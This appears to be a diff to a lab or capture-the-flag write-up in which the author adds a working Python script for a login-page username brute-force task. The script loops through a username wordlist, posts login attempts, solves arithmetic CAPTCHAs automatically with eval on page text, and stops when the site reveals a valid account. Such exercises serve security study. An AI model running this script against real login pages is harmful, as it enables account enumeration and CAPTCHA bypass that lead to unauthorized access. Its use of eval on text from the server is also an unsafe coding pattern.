@@ -39,3 +39,59 @@ The username hacking script must do the following:
 * When captcha is found in the response we must solve it and include it in the request payload. 
 * Loop through usernames and halt the script when a response returns html code that doesn't include ``Error: The user 'admin' does not exist``. 
 
+My solution might not be most elegant but it works to find the username lol
+<details>
+<summary>Code</summary>
+
+```
+
+import requests
+import re
+
+url = '' # replace with the URL of the login page
+
+with open('usernames.txt', 'r') as uf:
+    for username in uf:
+        username = username.strip()
+        
+        payload = {
+            "username" : username,
+            "password" : "test_password"
+        }
+
+        response = requests.post(url, data=payload)
+
+        if  "Invalid password for user"in response.text:
+            print(f"Correct username: {username}")
+            exit()
+        else:
+            # Solve CAPTCHA if present and send login request
+            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
+            captcha_text = ''
+            if captcha_match is not None:
+                captcha_text = captcha_match.group(0).replace('=', '').strip()
+                print("CAPTCHA text:", captcha_text)
+
+                # Solve the CAPTCHA and include the solution in the payload
+                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
+                if match:
+                    num1, operator, num2 = match.groups()
+                    solution = eval(num1 + operator + num2)
+                    print("Solution:", solution)
+                    print(username)
+                    payload['captcha'] = solution
+                else:
+                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
+                    continue
+            
+            # Send login request
+            response = requests.post(url, data=payload)
+
+            if "Invalid password for user" in response.text:
+                print(f"Valid username: {username}")
+                exit()
+
+
+
+```
+</details>
